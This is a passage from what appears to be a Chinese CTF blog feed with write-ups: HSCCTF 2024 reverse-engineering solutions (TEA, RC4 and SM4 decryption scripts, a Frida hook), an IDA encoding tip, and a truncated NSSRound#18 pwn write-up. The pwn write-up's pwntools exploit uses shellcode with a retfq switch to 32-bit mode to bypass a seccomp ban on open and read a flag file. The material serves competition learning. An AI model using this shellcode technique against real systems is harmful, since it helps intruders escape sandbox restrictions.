class="hljs-built_in">sum</span> = -<span class="hljs-number">32</span> * delta, i; /* <span class="hljs-built_in">set</span> up */<br><br>uint32_t v2[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">0x3D121D26</span>, <span class="hljs-number">0x5E6189F9</span>&#125;, v3[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">0xC1FB278E</span>, <span class="hljs-number">0x3B494648</span>&#125;, v5[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0xb805d767</span>, <span class="hljs-number">0x63c174c3</span>&#125;; //<span class="hljs-number">0x67</span>,<span class="hljs-number">0xd7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0xb8</span><br>unsigned <span class="hljs-built_in">int</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;, l = <span class="hljs-number">0</span>, r = <span class="hljs-number">0</span>;<br>uint32_t k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>// vä¸ºè¦åŠ å¯†çš„æ•°æ®æ˜¯ä¸¤ä¸ª<span class="hljs-number">32</span>ä½æ— ç¬¦å·æ•´æ•°<br>// kä¸ºåŠ å¯†è§£å¯†å¯†é’¥ï¼Œä¸º<span class="hljs-number">4</span>ä¸ª<span class="hljs-number">32</span>ä½æ— ç¬¦å·æ•´æ•°ï¼Œå³å¯†é’¥é•¿åº¦ä¸º<span class="hljs-number">128</span>ä½<br><br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> m = <span class="hljs-number">0</span>; m &lt; <span class="hljs-number">2</span>; m += <span class="hljs-number">2</span>) &#123;//flagä¸å…¨çš„è¯æœ‰å¯èƒ½æ˜¯<span class="hljs-number">10</span><br>//<span class="hljs-built_in">sum</span> = -<span class="hljs-number">957401312</span>;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;                     /* basic cycle start */<br>v5[m + <span class="hljs-number">1</span>] -= ((v5[m] &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v5[m] + <span class="hljs-built_in">sum</span>) ^ ((v5[m] &gt;&gt; <span class="hljs-number">5</span>) + k3);<br>v5[m] -= ((v5[m + <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v5[m + <span class="hljs-number">1</span>] + <span class="hljs-built_in">sum</span>) ^ ((v5[m + <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">5</span>) + k1);<br><span class="hljs-built_in">sum</span> += delta;<br>&#125;                                              /* end cycle */<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++) &#123;<br>printf(<span class="hljs-string">&quot;%x &quot;</span>, v5[i]);<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++) &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>//printf(<span class="hljs-string">&quot;%c&quot;</span>, (v5[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br><br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2024/03/10/HSCCTF2024/1709961543764-2858e782-886c-4814-a0aa-e5deb5787d5a.png" class="" title="img"><p>è°æ‡‚å•Šï¼Œexeè¾“å…¥é”™è¯¯ï¼Œä½†æ˜¯ç›´æ¥äº¤æ˜¯å¯¹çš„</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">688</span>ed036-a86a60ce&#125;<br></code></pre></td></tr></table></figure><h2 id="no-py"><a href="#no-py" class="headerlink" title="no_py"></a>no_py</h2><p>pycåç¼–è¯‘æ•ˆæœä¸å¥½</p><img src="/2024/03/10/HSCCTF2024/1709966236128-15b77610-7093-4097-be67-f0c51fd89e1d.png" class="" title="img"><p>ç”¨åœ¨çº¿å·¥å…·åå‘ç°keyå’Œencåœ¨å…¶ä»–æ–‡ä»¶ä¸­ï¼Œæ„Ÿè§‰å’ŒbeginCTFçš„ezpythonä¸€æ¨¡ä¸€æ ·</p><img src="/2024/03/10/HSCCTF2024/1709966361759-cd04823d-7b18-46fe-92de-685d0ab82524.png" class="" title="img"><img src="/2024/03/10/HSCCTF2024/1709966965760-a8512425-228e-4aec-a16b-50247053893f.png" class="" title="img"><img src="/2024/03/10/HSCCTF2024/1709967326961-01a13c08-39ea-41d0-a149-0b09f1ba2bbb.png" class="" title="img"><img src="/2024/03/10/HSCCTF2024/1709967524943-3a4e06c9-246e-417a-858c-f7bcaf4e2598.png" class="" title="img"><h2 id="roulette"><a href="#roulette" class="headerlink" title="roulette"></a>roulette</h2><p>åŸºæœ¬ç©ä¸å‡ºçš„æ¸¸æˆ</p><img src="/2024/03/10/HSCCTF2024/1710038562295-31b684f0-b508-4741-9a19-c167db74bd2d.png" class="" title="img"><p>é€šè¿‡ç®—æ³•è¯†åˆ«æ‰¾åˆ°blowfish</p><img src="/2024/03/10/HSCCTF2024/1710038776255-a545b936-9122-410b-83f6-e73861058139.png" class="" title="img"><p>7.5çš„æ±‰åŒ–æ•ˆæœå¥½</p><img src="/2024/03/10/HSCCTF2024/1710039007125-ad52680c-29fa-464a-9830-25e876189981.png" class="" title="img"><p>åæ¥æŒ‰é¢˜ç›®çš„æ€è·¯èµ°ï¼Œä¿®æ”¹ç¨‹åºä¸€æ¬¡å®Œæˆï¼Œåº”è¯¥æ˜¯è‡ªè§£å¯†ï¼Œä¸ç”¨è§£ç¨‹åºä¼šå¸®æˆ‘è§£</p><img src="/2024/03/10/HSCCTF2024/1710041102825-dbd65880-e0c1-42f9-aecf-21f84b4f1807.png" class="" title="img"><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">HSCCTF</span><span class="hljs-template-variable">&#123;H31L0_My_FR13ND!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="the-wolf-song"><a href="#the-wolf-song" class="headerlink" title="the_wolf_song"></a>the_wolf_song</h2><p>èƒ½è¯†åˆ«ä½†ç”¨ä¸ä¸Š</p><img src="/2024/03/10/HSCCTF2024/1710042320322-4ed576c7-5a94-4cb2-bf45-50ffa76d82a9.png" class="" title="img"><p>è°ƒè¯•è¿‡æ‰å‰é¢çš„éŸ³ä¹</p><img src="/2024/03/10/HSCCTF2024/1710054119801-e25294b2-b516-4e4a-873c-b812f5d83c02.png" class="" title="img"><p>rc4ç®—æ³•ï¼Œç¬¬ä¸€ä¸ªå†…å­˜ä¼šè¢«åˆå§‹åŒ–</p><img src="/2024/03/10/HSCCTF2024/1710054235494-d36be0da-eac4-4265-9a1c-75e7b59a40fc.png" class="" title="img"><p>æµç¨‹åœ¨ä»£ç çš„ç¬¬ä¸€è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#^6 -&gt; ^3 -&gt; rc4:HSCCTF&#123;FAKE_FLAG!&#125; -&gt; ^j -&gt; ^fake_flag[i] ^fake_flag[i+1] -&gt; ^j</span><br>fake_flag=<span class="hljs-string">&#x27;HSCCTF&#123;FAKE_FLAG!&#125;&#x27;</span><br>enc=[<span class="hljs-number">0xce</span>,<span class="hljs-number">0x26</span>,<span class="hljs-number">0x9c</span>,<span class="hljs-number">0x7</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0xd9</span>,<span class="hljs-number">0xfd</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0xba</span>,<span class="hljs-number">0x9a</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0xa8</span>,<span class="hljs-number">0x2e</span>,<span class="hljs-number">0xbd</span>,<span class="hljs-number">0xfc</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0xb7</span>,<span class="hljs-number">0x5d</span>,<span class="hljs-number">0x7e</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x99</span>,<span class="hljs-number">0xfd</span>,<span class="hljs-number">0xcd</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0xa</span>,<span class="hljs-number">0x94</span>,<span class="hljs-number">0x5b</span>,<span class="hljs-number">0x95</span>,<span class="hljs-number">0x2c</span>,<span class="hljs-number">0x26</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x1e</span>,<span class="hljs-number">0x1e</span>,<span class="hljs-number">0xb4</span>,<span class="hljs-number">0x30</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0xcf</span>,<span class="hljs-number">0xef</span>,<span class="hljs-number">0x68</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(enc))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data, key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append(char ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])<br><br>    <span class="hljs-keyword">return</span> out<br><br><span class="hljs-comment"># for i in range(len(enc)):</span><br><span class="hljs-comment">#     enc[i]^=i</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(fake_flag)-<span class="hljs-number">1</span>):<br>    enc[i]^=<span class="hljs-built_in">ord</span>(fake_flag[i+<span class="hljs-number">1</span>])<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(fake_flag)):<br>    enc[i]^=<span class="hljs-built_in">ord</span>(fake_flag[i])<br><br><span class="hljs-comment"># for i in range(len(enc)):</span><br><span class="hljs-comment">#     enc[i]^=i</span><br><br>key=<span class="hljs-built_in">bytes</span>(fake_flag.encode())<br>decrypted = rc4(enc, key)<br><span class="hljs-comment">#print(decrypted)</span><br><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(decrypted)):<br>    flag+=<span class="hljs-built_in">chr</span>(decrypted[i]^<span class="hljs-number">3</span>^<span class="hljs-number">6</span>)<br><span class="hljs-built_in">print</span>(flag)<br>HSCCTF&#123;Welcome_To_Participate_In_HSCCTF&#125;<br></code></pre></td></tr></table></figure><h2 id="Android-1"><a href="#Android-1" class="headerlink" title="Android-1"></a>Android-1</h2><p>å¤ç°æ¥è‡ªyuroâœŒ</p><img src="/2024/03/10/HSCCTF2024/1710057980233-dcb6dd18-2c42-474d-90c4-def9b46433e5-17102079978971.png" class="" title="img"><p>æ‰¾åˆ°å…³é”®å‡½æ•°ï¼Œmurmur3_32 å“ˆå¸Œç®—æ³•ï¼Œå¾—åˆ°ä¸€ä¸ª 32 å­—èŠ‚çš„å“ˆå¸Œï¼Œä½œä¸º key  </p><img src="/2024/03/10/HSCCTF2024/1710058239980-9f7b6594-99ca-4cf5-a0f6-aef795cbbdb7-17102079978983.png" class="" title="img"><p>sm4ç«Ÿç„¶æ’ä»¶æ²¡è¯†åˆ«å‡ºæ¥ï¼Ÿçœ‹å¸¸æ•°å°±å¯ä»¥å‘ç°</p><img src="/2024/03/10/HSCCTF2024/1710058389286-a856058d-c969-42f7-9b0d-228886c4e399-17102079978985.png" class="" title="img"><p>åŒä¸€æ’ä»¶ida7.7å°±èƒ½è¯†åˆ«</p><img src="/2024/03/10/HSCCTF2024/1710161320739-5f24379d-4131-48ff-8bf3-15d19f64e002.png" class="" title="img"><p>hook _Z10murmur3_32PKcjjå‡½æ•° å¾—åˆ°è¿”å›å€¼</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> func_addr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libmidand.so&quot;</span> , <span class="hljs-string">&quot;_Z10murmur3_32PKcjj&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;func addr is ---&quot;</span> + func_addr);<br><span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(func_addr, &#123;<br>  <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;enter murmur3_32 retvalue-&gt;\n&quot;</span> + <span class="hljs-title function_">hexdump</span>(args));<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>æˆ‘ç”¨çš„æ˜¯é›·ç”µæ¨¡æ‹Ÿå™¨ï¼Œå‰ç½®æ­¥éª¤ç½‘ä¸Šæœ‰ï¼Œä¹Ÿå¯ä»¥çœ‹è¿™ä¸ª</p><p><a href="https://www.yuque.com/u34082223/swqzq3/zdpepl9de1zwz7mw">https://www.yuque.com/u34082223/swqzq3/zdpepl9de1zwz7mw</a></p><p>è¿è¡Œè¿œç¨‹frida-serveråç”¨<code>frida -U -l 1.js -f MidAnd</code>ï¼Œä¸€å¼€å§‹æ‰¾ä¸åˆ°MidAndï¼Œç”¨findstræ‰è¡Œ</p><img src="/2024/03/10/HSCCTF2024/1710207312322-fcd1a619-46be-447b-a865-602cad21ca7f.png" class="" title="img"><p>ä¸€å¼€å§‹ä¸€ç›´æŠ¥é”™</p><img src="/2024/03/10/HSCCTF2024/1710166946004-61d68afc-f771-4451-b35c-f5215bb59651.png" class="" title="img"><p>åœ¨æ¨¡æ‹Ÿå™¨ä¸Šè¾“å…¥å­—ç¬¦ç„¶åç‚¹loginå°±å¥½äº†</p><img src="/2024/03/10/HSCCTF2024/1710207589439-8766b8f9-5ba4-4f91-b2fe-7c9992241683.png" class="" title="img"><img src="/2024/03/10/HSCCTF2024/1710166891275-3b1302ac-022b-4296-b8c7-b9fdff543fea.png" class="" title="img"><p>å†ç”¨SM4è§£å¯†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmssl <span class="hljs-keyword">import</span> sm4<br><br>enc = <span class="hljs-built_in">bytearray</span>.fromhex(<span class="hljs-string">&quot;731E133EF76A5CD1EF9626A9947CF4A46CE237B70D4905E921E35E2E7D7A1A74&quot;</span>)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">               0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF</span><br><span class="hljs-string">7f13c97b0d00  c4 83 84 72 b8 e1 60 ba 5d 99 5a 6b e3 67 40 17  ...r..`.].Zk.g@.</span><br><span class="hljs-string">7f13c97b0d10  7c 3f 33 21 91 1c fa 54 8f 35 30 73 dd 2b 80 a7  |?3!...T.50s.+..</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>key1 = <span class="hljs-built_in">bytearray</span>.fromhex(<span class="hljs-string">&quot;c4838472b8e160ba5d995a6be3674017&quot;</span>)<br>key2 = <span class="hljs-built_in">bytearray</span>.fromhex(<span class="hljs-string">&quot;7c3f3321911cfa548f353073dd2b80a7&quot;</span>)<br><br>s = sm4.CryptSM4(padding_mode=sm4.zero_padding)<br><br>s.set_key(key1, sm4.SM4_DECRYPT) <br>dec = s.crypt_ecb(enc[:<span class="hljs-number">16</span>]) <br><span class="hljs-built_in">print</span>(dec.decode(), end=<span class="hljs-string">&quot;&quot;</span>)<br><br>s.set_key(key2, sm4.SM4_DECRYPT) <br>dec = s.crypt_ecb(enc[<span class="hljs-number">16</span>:]) <br><span class="hljs-built_in">print</span>(dec.decode(), end=<span class="hljs-string">&quot;&quot;</span>)<br>flag&#123;fad1c7e27ec411eebe3a3e4419a1b3cc&#125;  <br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="funny"><a href="#funny" class="headerlink" title="funny"></a>funny</h2><img src="/2024/03/10/HSCCTF2024/1710041422186-08d964df-4990-493b-be7d-25c5069b4332.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VM</tag>
      
      <tag>sm4</tag>
      
      <tag>blowfishåŠ å¯†</tag>
      
      <tag>shellcode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDAæ˜¾ç¤ºä¸­æ–‡å­—ç¬¦</title>
    <link href="/2024/03/04/IDA%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/"/>
    <url>/2024/03/04/IDA%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/</url>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰idaä¸€ç›´ä¸çŸ¥é“å¦‚ä½•è¯†åˆ«ä¸­æ–‡å­—ç¬¦<img src="/2024/03/04/IDA%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/image-20240304210011904.png" class="" title="image-20240304210011904"></p><p>åœ¨ç›®å½•åé¢åŠ å‚æ•°-dCULTURE&#x3D;allå’ŒæŠŠç¼–ç æ–¹å¼æ”¹ä¸ºgbkéƒ½å¤±è´¥äº†</p><p>åæ¥ç”¨å­¦é•¿çš„idaå‘ç°èƒ½æ­£å¸¸æ˜¾ç¤ºä¸­æ–‡ï¼ŒæŸ¥çœ‹ç¼–ç æ–¹å¼åŸæ¥æ˜¯gb2312</p><p>äºæ˜¯æˆ‘åœ¨ida8.3é‡Œå³é”®æ’å…¥æ–°çš„ç¼–ç æ–¹å¼</p><img src="/2024/03/04/IDA%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/image-20240304210343584.png" class="" title="image-20240304210343584"><p>ç„¶ååœ¨idaå·¦ä¸‹è§’å³é”®é‡æ–°åˆ†æ</p><img src="/2024/03/04/IDA%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/image-20240304210511607.png" class="" title="image-20240304210511607"><p>å†å³é”®rebuildå³å¯</p><img src="/2024/03/04/IDA%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/image-20240304210546604.png" class="" title="image-20240304210546604">]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒé…ç½®</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>NSSRound#18éƒ¨åˆ†wp</title>
    <link href="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/"/>
    <url>/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="HappyCTF"><a href="#HappyCTF" class="headerlink" title="HappyCTF"></a>HappyCTF</h2><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://xz.aliyun.com/t/6645?time__1311=n4+xnD0DRDBGitN47KDsA3xCqbu75eD9AQ=oD&alichlgref=https://www.baidu.com/link?url=A-_IFOUlIylJIvrt12kXZxAyQ2f2S3p-psE9bObB9i-3sfMgYghL6qEvFbu98k-Q&wd=&eqid=f2850db1072b3e270000000265cc33af">https://xz.aliyun.com/t/6645?time__1311=n4%2BxnD0DRDBGitN47KDsA3xCqbu75eD9AQ%3DoD&amp;alichlgref=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DA-_IFOUlIylJIvrt12kXZxAyQ2f2S3p-psE9bObB9i-3sfMgYghL6qEvFbu98k-Q%26wd%3D%26eqid%3Df2850db1072b3e270000000265cc33af</a></p><p>çœ‹åˆ°rwxåŸºæœ¬ä¸Šæ˜¯shellcode</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707882413729-a8b684db-8573-447e-a278-5447c939771a-170808409444444.png" class="" title="img"><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707882320571-ffb866fd-3a4b-4970-9dd8-2565512afce9-170808409444446.png" class="" title="img"><p>vulnå‡½æ•°åç¼–è¯‘ä¸äº†ï¼Œé—®é¢˜ä¸å¤§</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707879608622-3f721439-e2cf-4a39-a7a5-7452e147cf52-170808409444448.png" class="" title="img"><p>æ•²ï¼Œåé¢å‘ç°æŠŠopenç»™ç¦äº†ï¼Œé‚£å¾—ç”¨retfqå’Œretfäº†</p><img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708081299573-447e5ca9-254f-4562-87cd-130c5e595733.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment">#p = remote(&quot;node1.anna.nssctf.cn&quot;,28592)</span><br>p = process(<span class="hljs-string">&quot;./HappyCTF&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./HappyCTF&quot;</span>)<br><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : p.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : p.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> p.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rl</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><br><span class="hljs-comment">#gdb.attach(p,&#x27;b *0x4013a0&#x27;)</span><br>sh = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">push 0x40404040 /*set rdi*/</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x7e /*set rsi*/</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 9 /*set rdx*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 7</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">push 34</span><br><span class="hljs-string">pop r10</span><br><span class="hljs-string">xor r9,r9</span><br><span class="hljs-string">xor r8,r8</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">/read/</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">xor rdi,rdi</span><br><span class="hljs-string">push 0x40404040</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string">push 200</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x23</span><br><span class="hljs-string">push rsi</span><br><span class="hljs-string">retfq</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>sd = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov esp,0x40404040</span><br><span class="hljs-string">mov eax,5</span><br><span class="hljs-string">push 0x00006761</span><br><span class="hljs-string">push 0x6c662f2e</span><br><span class="hljs-string">mov ebx,esp</span><br><span class="hljs-string">xor ecx,ecx</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string">push 0x33</span><br><span class="hljs-string">push 0x40404062</span><br><span class="hljs-string">retf</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>,arch = <span class="hljs-string">&#x27;i386&#x27;</span>)<br>sf = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rax,0</span><br><span class="hljs-string">mov rdi,3</span><br><span class="hljs-string">mov rsi,0x40404128</span><br><span class="hljs-string">mov rdx,0x30</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">mov rsi,0x40404128</span><br><span class="hljs-string">mov rdx,0x30</span><br><span 